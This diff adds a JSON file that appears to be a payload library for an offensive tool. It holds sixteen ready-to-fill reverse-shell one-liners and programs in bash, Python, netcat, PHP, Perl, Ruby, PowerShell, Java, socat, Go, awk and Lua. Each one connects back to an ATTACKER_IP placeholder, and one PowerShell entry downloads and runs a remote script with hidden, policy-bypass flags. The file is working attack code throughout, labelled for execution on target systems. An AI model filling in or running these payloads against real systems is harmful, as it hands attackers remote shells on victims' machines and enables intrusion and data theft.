@@ -1,0 +1,151 @@
+{
+  "bash_tcp": {
+    "name": "Bash TCP Reverse Shell",
+    "description": "Standard bash reverse shell using /dev/tcp",
+    "code": "bash -i >& /dev/tcp/{{ATTACKER_IP}}/{{ATTACKER_PORT}} 0>&1",
+    "usage": "Execute on target system",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux",
+    "requirements": ["bash", "/dev/tcp support"]
+  },
+  
+  "bash_udp": {
+    "name": "Bash UDP Reverse Shell",
+    "description": "UDP-based bash reverse shell",
+    "code": "bash -i >& /dev/udp/{{ATTACKER_IP}}/{{ATTACKER_PORT}} 0>&1",
+    "usage": "Execute on target system with nc -ulp PORT",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux"
+  },
+  
+  "python_pty": {
+    "name": "Python PTY Reverse Shell",
+    "description": "Full PTY shell with Python",
+    "code": "python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ATTACKER_IP}}\",{{ATTACKER_PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+    "usage": "Spawns interactive bash shell",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux",
+    "requirements": ["python3"]
+  },
+  
+  "python_windows": {
+    "name": "Python Windows Reverse Shell",
+    "description": "Python reverse shell for Windows",
+    "code": "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{{ATTACKER_IP}}',{{ATTACKER_PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe'])\"",
+    "usage": "Windows command shell via Python",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "windows"
+  },
+  
+  "netcat_traditional": {
+    "name": "Netcat Traditional",
+    "description": "Classic netcat reverse shell",
+    "code": "nc -e /bin/sh {{ATTACKER_IP}} {{ATTACKER_PORT}}",
+    "usage": "Requires nc with -e support",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux",
+    "requirements": ["nc -e support"]
+  },
+  
+  "netcat_mkfifo": {
+    "name": "Netcat FIFO",
+    "description": "Netcat reverse shell using named pipe",
+    "code": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ATTACKER_IP}} {{ATTACKER_PORT}} >/tmp/f",
+    "usage": "Works with OpenBSD netcat",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux"
+  },
+  
+  "php_reverse": {
+    "name": "PHP Reverse Shell",
+    "description": "PHP socket-based reverse shell",
+    "code": "php -r '$sock=fsockopen(\"{{ATTACKER_IP}}\",{{ATTACKER_PORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "usage": "One-liner PHP reverse shell",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux",
+    "requirements": ["php-cli"]
+  },
+  
+  "perl_reverse": {
+    "name": "Perl Reverse Shell",
+    "description": "Perl socket reverse shell",
+    "code": "perl -e 'use Socket;$i=\"{{ATTACKER_IP}}\";$p={{ATTACKER_PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+    "usage": "Perl-based reverse shell",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux"
+  },
+  
+  "ruby_reverse": {
+    "name": "Ruby Reverse Shell",
+    "description": "Ruby socket reverse shell",
+    "code": "ruby -rsocket -e'f=TCPSocket.open(\"{{ATTACKER_IP}}\",{{ATTACKER_PORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+    "usage": "Ruby one-liner",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux"
+  },
+  
+  "powershell_tcp": {
+    "name": "PowerShell TCP Reverse Shell",
+    "description": "PowerShell TCP reverse shell",
+    "code": "$client = New-Object System.Net.Sockets.TCPClient('{{ATTACKER_IP}}',{{ATTACKER_PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+    "usage": "PowerShell reverse shell for Windows",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "windows"
+  },
+  
+  "powershell_base64": {
+    "name": "PowerShell Base64 Encoded",
+    "description": "Encoded PowerShell reverse shell",
+    "code": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://{{ATTACKER_IP}}/shell.ps1')\"",
+    "usage": "Downloads and executes remote PowerShell script",
+    "variables": ["ATTACKER_IP"],
+    "os": "windows"
+  },
+  
+  "java_reverse": {
+    "name": "Java Reverse Shell",
+    "description": "Java socket reverse shell",
+    "code": "public class Shell {\n    public static void main(String[] args) {\n        try {\n            String host=\"{{ATTACKER_IP}}\";\n            int port={{ATTACKER_PORT}};\n            String cmd=\"/bin/sh\";\n            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s=new Socket(host,port);\n            java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n            java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();\n            while(!s.isClosed()) {\n                while(pi.available()>0) so.write(pi.read());\n                while(pe.available()>0) so.write(pe.read());\n                while(si.available()>0) po.write(si.read());\n                so.flush(); po.flush();\n                Thread.sleep(50);\n                try { p.exitValue(); break; } catch (Exception e) {}\n            };\n            p.destroy(); s.close();\n        } catch (Exception e) {}\n    }\n}",
+    "usage": "Compile and execute Java reverse shell",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux"
+  },
+  
+  "socat_encrypted": {
+    "name": "Socat Encrypted Reverse Shell",
+    "description": "Encrypted reverse shell using socat",
+    "code": "socat openssl-connect:{{ATTACKER_IP}}:{{ATTACKER_PORT}},verify=0 exec:/bin/bash",
+    "usage": "Encrypted communication channel",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux",
+    "requirements": ["socat"]
+  },
+  
+  "golang_reverse": {
+    "name": "Golang Reverse Shell",
+    "description": "Go language reverse shell",
+    "code": "package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{{ATTACKER_IP}}:{{ATTACKER_PORT}}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}",
+    "usage": "Compile with: go build shell.go",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux"
+  },
+  
+  "awk_reverse": {
+    "name": "AWK Reverse Shell",
+    "description": "AWK-based reverse shell",
+    "code": "awk 'BEGIN {s = \"/inet/tcp/0/{{ATTACKER_IP}}/{{ATTACKER_PORT}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+    "usage": "Works on systems with gawk",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux",
+    "requirements": ["gawk"]
+  },
+  
+  "lua_reverse": {
+    "name": "Lua Reverse Shell",
+    "description": "Lua socket reverse shell",
+    "code": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{{ATTACKER_IP}}','{{ATTACKER_PORT}}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
+    "usage": "Lua one-liner shell",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
+    "os": "linux"
+  }
+}
